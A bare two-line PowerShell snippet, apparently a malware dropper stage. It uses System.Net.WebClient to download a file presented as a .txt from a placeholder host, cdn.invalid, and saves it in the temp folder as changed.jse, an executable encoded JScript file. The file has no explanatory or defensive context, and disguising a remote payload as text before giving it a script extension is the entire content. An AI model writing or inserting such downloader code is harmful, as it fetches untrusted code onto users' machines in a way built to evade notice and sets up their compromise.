$client = New-Object System.Net.WebClient
$client.DownloadFile("https://cdn.invalid/new-name.txt", "%TMP%/changed.jse")
